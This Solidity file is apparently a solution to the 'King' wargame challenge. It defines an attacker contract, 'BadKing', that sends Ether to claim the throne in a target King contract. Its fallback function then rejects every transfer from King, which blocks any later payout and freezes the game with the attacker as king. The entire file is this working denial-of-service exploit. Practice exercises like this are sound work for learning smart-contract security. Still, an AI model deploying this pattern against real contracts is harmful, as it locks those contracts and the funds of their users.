pragma solidity ^0.5.1;

import "./King.sol";

contract BadKing {
    King private king;
    address payable kingAddress;

    constructor(address payable _kingAddress) public payable {
        king = King(_kingAddress);
        kingAddress = _kingAddress;
    }

    function dethroneKing(uint256 _prize) public {
        kingAddress.call.value(_prize)("");
    }

    function() external payable {
        require(
            msg.sender != kingAddress,
            "Not accepting transfers from King contract"
        );
    }
}
